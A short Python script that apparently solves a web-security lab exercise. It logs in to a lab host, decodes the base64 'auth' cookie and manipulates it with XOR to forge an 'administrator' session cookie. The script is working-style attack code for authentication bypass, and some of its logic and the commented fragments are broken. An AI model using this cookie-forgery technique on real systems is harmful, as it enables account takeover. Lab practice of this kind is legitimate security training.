import base64
import requests
import urllib.parse as urlib
def login(username):
    url = "http://ptl-5e2c7d35-17a1c4bb.libcurl.so"
    data = { 'username': username, 'password' :'Password1'}
    session = requests.Session()
    res = session.post(url= url+"/login.php", data= data)
    coke =  session.cookies.get_dict()
    return coke['auth'] 

encod_cook = login("administ")
decod = base64.urlsafe_b64decode(urlib.unquote(encod_cook))
decod = decod.split(b"--")[1]
print(decod)
def xor(bit1, str1):
    i =0
    ret = []
    while i < 8:
        ret.append(chr(i ^ ord(str1[i])))
        i=i+1
    print(ret)
    rez = "".join(ret)
    return rez
rator = ["r","a","t","o","r","\00","\00","\00"]
username2 = xor(decod, rator)
print(username2)
new_cook = login(username2)
des = base64.urlsafe_b64decode(urlib.unquote(new_cook))
print(des)
des = des.split(b"--")[1]
print(des)
final = b"administrator--"+(des)
print(final)
final = base64.b64encode(final)
print(final)

'''
sig1 = sig1[1:]
str2 = ['r','a','t','o','r'("".join(list1)) ,00, 00, 00]
print(sig1)
for i in sig1:
    print(sig1[i]^sig2[i])
'''

# def xor(str1, str2):
#    ret = ""
#    for each in str1.split("".join(list1)) ("\\"):
#        ret
